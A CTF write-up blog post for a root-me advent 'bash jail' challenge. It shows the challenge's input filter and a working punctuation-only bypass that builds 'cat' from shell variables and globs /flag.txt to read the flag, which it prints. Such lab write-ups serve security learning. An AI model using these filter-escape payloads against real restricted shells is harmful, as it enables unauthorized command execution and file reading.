---
title: "bash-jail"
date: 2025-12-24T12:00:09+02:00
---

## day8 of root-me advent

This is a bash jail challenge.

```bash
function check_input() {
    if [[ $1 =~ '..' || $1 =~ './' || $1 =~ [[:space:]]'/' ]]
    then
        return 0
    fi
    if [[ $1 =~ [[:alnum:][:space:]] ]];
    then
        return 0
    fi
    if [[ $1 =~ '<' || $1 =~ '>' ]];
    then
        return 0
    fi

    return 1
}
```

We only can use ponctuation characters.

# Reminder:

```bash
"$_" is the last command -> /bin/bash
"$-" is the arguments passed to bash -> rwBc
"~" is the $HOME variable -> /root
```

# get letters

We need to get numbers to make offsets.

```bash
"___=${#_[*]}" is the length of array _ -> 1
```
We can just sum it to get the desired number.

with 
```bash
__=$_;___=${#_[*]};____=$___;((____+=$____));((____+=$____));((____+=$___));((____+=$___));_______=${__:____:___}
```
We store ${/bin/bash:6:1}, which is "a", in variable "_______".

```bash
__=$-;___=${#_[*]};____=$___;((____+=$___));((____+=$___));______=${__:____} ## get c
__=~;___=${#_[*]};____=$___;((____+=$____));((____+=$____));________=${__:____} ## get t
```

# we get "cat"

To get the string /flag.txt we can use bash expansion such as /????.???

Now just exeucute it 
```bash
__=/????.???;$({${______}${_______}${________},$__}) # $({cat,/flag.txt})
```

Run this commands in one line give us an error :
```bash
/bin/bash: line 1: RM{0mG_Y3S_1_kn3w_y0u_w0uld_h3l/.../ME<<<3}: command not found
```

Which is the flag !!!

# Thanks Mistrale <3
